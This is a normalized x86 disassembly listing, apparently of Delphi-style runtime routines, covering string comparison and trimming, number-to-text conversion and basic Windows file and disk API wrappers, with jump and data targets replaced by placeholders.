and eax 0xffff0000
and ebx 0xffff0000
cmp eax ebx
je r-xdata
sub ebx 0x20
sub_43501c
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_434f0c
test eax eax
jne r-xdata
sub_435040
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4350c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx eax
mov eax esi
mov ecx ebx
call sub_449e68
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4350cb
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
push ebx
mov eax [ esi ]
call sub_449db8
push eax
call CharUpperBuffW
sub_4350d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
mov eax [ ebp - 0x8 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43518c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push esi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435193
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
sub_43519c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43524e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
lea eax [ ebp - 0x4 ]
call sub_4494ec
cmp [ eax + ebx * 2 - 0x2 ] 0x20
jbe r-xdata
lea eax [ ebp - 0x4 ]
call sub_4494ec
cmp [ eax + esi * 2 - 0x2 ] 0x20
jbe r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_449d2c
jmp r-xdata
inc ebx
dec esi
mov eax [ ebp - 0x8 ]
push eax
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435255
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43525c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4353c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx eax
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
add esi esi
add esi ebx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edi eax
cmp esi ebx
jbe r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax ebx
call sub_449bb4
cmp edi eax
jne r-xdata
movzx eax [ ebx ]
sub ax 0xa
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx edi
xor edx edx
call sub_449e68
mov eax [ ebp - 0xc ]
mov eax [ eax ]
cmp esi ebx
jbe r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_449d2c
jmp r-xdata
cmp [ ebp - 0x5 ] 0x1
jne r-xdata
sub ax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4353c8
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
movzx edx [ ebx ]
mov ecx edx
sub cx 0xa
je r-xdata
add ebx 0x2
cmp esi ebx
ja r-xdata
inc edi
jmp r-xdata
cmp [ ebp - 0x5 ] 0x1
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x5 ] 0x1
jne r-xdata
sub cx 0x3
je r-xdata
cmp [ ebx + 0x2 ] 0xa
jne r-xdata
cmp [ ebx + 0x2 ] 0xa
jne r-xdata
mov [ eax ] 0xa
add eax 0x2
add ebx 0x2
jmp r-xdata
mov [ eax ] 0xd
add eax 0x2
cmp [ ebp - 0x5 ] 0x1
jne r-xdata
jmp r-xdata
dec edi
inc edi
jmp r-xdata
add ebx 0x2
jmp r-xdata
cmp esi ebx
ja r-xdata
mov [ eax ] 0xa
add eax 0x2
add ebx 0x2
cmp [ ebx ] 0xa
jne r-xdata
mov [ eax ] 0xd
add eax 0x2
mov [ eax ] dx
add eax 0x2
add ebx 0x2
add ebx 0x2
jmp r-xdata
sub_4353d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_435569
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov al 0x1
jmp r-xdata
movzx eax [ esi ]
call sub_41cf8c
test al al
jne r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
test al al
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] 0x5f
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435570
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
test bl bl
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edi eax
sub edi 0x2
jl r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
sub edi 0x2
jl r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov [ ebp - 0x5 ] 0x1
inc edi
mov ebx 0x2
inc edi
mov ebx 0x2
movzx eax [ esi + ebx * 2 - 0x2 ]
call sub_41d018
test al al
jne r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
movzx eax [ esi + ebx * 2 - 0x2 ]
call sub_41d018
test al al
jne r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
inc ebx
dec edi
jne r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0x5f
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
inc ebx
dec edi
jne r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0x5f
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
jmp r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0x2e
jne r-xdata
sub_43557c
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_435592
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_435592
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_435592
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4355e4
mov ecx 0xa
push edx
push esi
mov [ esi ] dx
or eax eax
jne r-xdata
add dx 0x7
xor edx edx
div ecx
add dx 0x30
sub esi 0x2
cmp dx 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
shr ecx 0x1
sub edx ecx
jbe r-xdata
retn
add ecx edx
sub esi edx
mov ax 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ esi + edx * 2 ] ax
mov [ esi ] ax
sub_435628
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_43557c
mov edx esi
pop eax
call sub_449e58
add esp 0x10
pop esi
retn
sub_435648
push ebp
mov ebp esp
add esp 0xfffffff8
push 0x0
lea edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] 0x10
lea ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_436554
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4356bc
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] ax
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add ax 0x7
fild [ esp ]
fld st1
sub esi 0x2
fprem
fistp [ esi ]
fdiv st1
mov ax [ esi ]
add ax 0x30
cmp ax 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
shr ecx 0x1
or edx edx
js r-xdata
retn
sub edx ecx
jbe r-xdata
sub esi edx
mov ax 0x30
sub esi edx
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ esi + edx * 2 ] ax
mov [ esi ] ax
sub_435768
or cl cl
jne sub_43579c
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_43579c
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_43579c
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_43579c
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_435834
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_435768
mov edx esi
pop eax
call sub_449e58
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_43585c
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_43557c
mov edx esi
pop eax
call sub_449e58
add esp 0x20
pop esi
retn
xor edx edx
sub_435884
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_447b80
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0x11
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_434b8c
sub_4358d8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_447b80
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4358f8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_44abb0
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_435918
mov eax [ rw-data ]
call sub_44af28
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_44af28
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_449d2c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_449d2c
sub_4359b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
xor ecx ecx
push ebp
push sub_435ab6
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov [ ebp - 0x9 ] 0x0
test edx edx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435abd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
inc edx
mov [ ebp - 0x14 ] edx
mov ebx eax
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push edi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
test eax eax
sete al
test al al
je r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
add ebx 0x4
dec [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov edi [ ebx ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] esi
mov edx [ ebp - 0x18 ]
call sub_449d80
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] edi
mov edx [ ebp - 0x18 ]
call sub_449d80
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_435ac8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_437334
mov edx eax
test dl dl
je r-xdata
call sub_435918
push ebp
mov eax [ rw-data ]
call sub_44af30
mov edx eax
mov eax [ rw-data ]
call sub_4359b8
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_44af30
mov edx eax
mov eax [ rw-data ]
call sub_4359b8
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_435b70
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_449d2c
call sub_435918
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_449d2c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_449d2c
jmp r-xdata
pop esi
pop ebx
retn
sub_435bbc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_449db8
push eax
call CreateFileW
sub_435c14
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_435c40
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_435c6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call GetLastError
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
sub_435cbc
push ebp
mov ebp esp
add esp 0xfffffdb0
lea eax [ ebp - 0x250 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call FindFirstFileW
cmp eax 0xffffffff
je r-xdata
xor eax eax
push eax
call FindClose
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
lea eax [ ebp - 0x250 ]
mov ecx 0x24
call sub_4476cc
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
sub_435d08
push ebp
mov ebp esp
push r-xdata
push r-xdata
call GetModuleHandleW
push eax
call sub_41d36c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0xc
mov [ rw-data ] sub_435cbc
sub_435d98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_435e64
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
mov eax ebx
call sub_449db8
mov [ ebp - 0x8 ] eax
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e6b
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
cmp [ ebx + esi * 2 - 0x2 ] 0x0
je r-xdata
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
dec esi
test esi esi
jg r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov ebx eax
movzx edx [ edi + esi * 2 - 0x2 ]
mov eax [ ebp - 0x8 ]
call sub_4362d8
test eax eax
jne r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
sub_435e74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_435f24
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_435d98
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + ebx * 2 - 0x2 ] 0x2e
setne al
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44a368
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx esi
call sub_44a0e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f2b
lea eax [ ebp - 0xc ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov ebx 0x7fffffff
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_435f48
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_435d98
mov esi eax
push edi
mov ecx esi
mov edx 0x1
mov eax ebx
call sub_44a368
pop edi
pop esi
pop ebx
retn
sub_435f84
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_435d98
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_44a368
pop edi
pop esi
pop ebx
retn
sub_435fc4
push ebx
push esi
add esp 0xfffffdf4
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_449db8
push eax
call GetFullPathNameW
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_449e68
add esp 0x20c
pop esi
pop ebx
retn
sub_436000
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceW
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_44ab8c
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_44ab8c
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_436074
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
mov edx eax
neg edx
add eax 0x1
and eax 0xfffffffe
mov cx [ eax ]
add eax 0x2
test cl ch
jne r-xdata
test cl cl
je r-xdata
lea eax [ edx + eax - 0x2 ]
retn
test ch ch
jne r-xdata
lea eax [ edx + eax - 0x1 ]
retn
sub_4360a4
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
mov edx eax
neg edx
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
lea eax [ edx + eax - 0x2 ]
shr eax 0x1
retn
sub_4360f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4360a4
inc eax
mov ecx eax
add ecx ecx
mov edx ebx
mov eax esi
call sub_4476cc
mov eax ebx
pop esi
pop ebx
retn
sub_436110
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] esi
mov eax edi
call sub_4360a4
mov ebx eax
cmp ebp ebx
jae r-xdata
mov ecx ebx
add ecx ecx
mov edx esi
mov eax edi
call sub_4476cc
mov [ esi + ebx * 2 ] 0x0
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx ebp
sub_43614c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4361c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx eax
mov ecx ebx
mov eax esi
call sub_436110
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4361c7
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_4361d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_449db8
mov edx eax
mov ecx edi
mov eax ebx
call sub_436110
pop edi
pop esi
pop ebx
retn
sub_4361f0
push esi
push edi
mov ecx eax
mov esi edx
movzx edi ax
movzx eax dx
sub edi eax
jmp r-xdata
test ax ax
jne r-xdata
mov eax edi
pop edi
pop esi
retn
add ecx 0x2
add esi 0x2
jmp r-xdata
movzx eax [ ecx ]
movzx edx [ esi ]
cmp dx ax
jne r-xdata
sub_436220
push esi
push edi
add esp 0xfffffff8
mov [ esp ] ecx
mov esi eax
mov edi edx
xor ecx ecx
cmp ecx [ esp ]
jae r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
movzx eax [ esi ]
movzx edx [ edi ]
cmp dx ax
jne r-xdata
movzx eax ax
movzx edx dx
sub eax edx
mov [ esp + 0x4 ] eax
jmp r-xdata
